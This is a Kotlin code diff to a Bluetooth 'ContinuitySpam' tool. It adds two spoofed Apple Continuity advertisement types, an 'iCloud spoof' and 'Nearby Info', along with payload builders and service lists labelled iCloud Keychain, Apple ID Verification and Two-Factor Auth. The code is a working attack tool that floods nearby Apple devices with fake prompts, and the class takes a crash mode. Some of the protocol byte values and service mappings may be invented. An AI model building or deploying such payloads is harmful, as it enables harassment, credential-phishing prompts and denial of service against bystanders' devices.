@@ -62,6 +62,16 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
         } else {
             emptyArray()
         }
+        ContinuityType.ICLOUD_SPOOF -> {
+            ICLOUD_SERVICES.map { (key, value) ->
+                ContinuityDevice("0x$key", value, ContinuityType.ICLOUD_SPOOF)
+            }.toTypedArray()
+        }
+        ContinuityType.NEARBY_INFO -> {
+            NEARBY_INFO_SERVICES.map { (key, value) ->
+                ContinuityDevice("0x$key", value, ContinuityType.NEARBY_INFO)
+            }.toTypedArray()
+        }
     }
 
     override fun start() {
@@ -90,6 +100,12 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
                     }
                     ContinuityType.ACTION -> {
                         buildNearbyActionPayload(deviceVal)
+                    }
+                    ContinuityType.ICLOUD_SPOOF -> {
+                        buildICloudPayload(deviceVal)
+                    }
+                    ContinuityType.NEARBY_INFO -> {
+                        buildNearbyInfoPayload(deviceVal)
                     }
                 }
 
@@ -238,7 +254,58 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
         return Helper.convertHexToByteArray(payloadHex)
     }
 
+    private fun buildICloudPayload(serviceHex: String): ByteArray {
+        val randomPart = getRandomHexBytes(20)
+        val hex = "0D16" + serviceHex.removePrefix("0x").uppercase().padStart(2, '0') + randomPart
+        return Helper.convertHexToByteArray(hex)
+    }
+
+    private fun buildNearbyInfoPayload(serviceHex: String): ByteArray {
+        val status = String.format("%02X", rand.nextInt(256))
+        val randomPart = getRandomHexBytes(18)
+        val hex = "1015" + serviceHex.removePrefix("0x").uppercase().padStart(2, '0') + status + randomPart
+        return Helper.convertHexToByteArray(hex)
+    }
+
     companion object {
+        val ICLOUD_SERVICES = mapOf(
+            "01" to "iCloud Keychain",
+            "02" to "iCloud Photos",
+            "03" to "iCloud Drive",
+            "04" to "Find My",
+            "05" to "iCloud Backup",
+            "06" to "iCloud Mail",
+            "07" to "iCloud Contacts",
+            "08" to "iCloud Calendar",
+            "09" to "iCloud Notes",
+            "0A" to "iCloud Reminders",
+            "0B" to "Sign in with Apple",
+            "0C" to "Apple ID Verification",
+            "0D" to "iCloud Settings",
+            "0E" to "Two-Factor Auth",
+        )
+
+        val NEARBY_INFO_SERVICES = mapOf(
+            "01" to "Nearby Info – General",
+            "02" to "Nearby Info – iCloud",
+            "03" to "Nearby Info – Handoff",
+            "04" to "Nearby Info – Continuity Camera",
+            "05" to "Nearby Info – Sidecar",
+        )
+
+        fun createICloudPayload(serviceHex: String): ByteArray {
+            val randomPart = Helper.randomHexFiller(40)
+            val hex = "0D16" + serviceHex.removePrefix("0x").uppercase().padStart(2, '0') + randomPart
+            return Helper.convertHexToByteArray(hex)
+        }
+
+        fun createNearbyInfoPayload(serviceHex: String): ByteArray {
+            val rand = Random()
+            val status = String.format("%02X", rand.nextInt(256))
+            val randomPart = Helper.randomHexFiller(36)
+            val hex = "1015" + serviceHex.removePrefix("0x").uppercase().padStart(2, '0') + status + randomPart
+            return Helper.convertHexToByteArray(hex)
+        }
         private const val TAG = "ContinuitySpam"
         private const val COLOR_KEY_DEFAULT = "00"
         
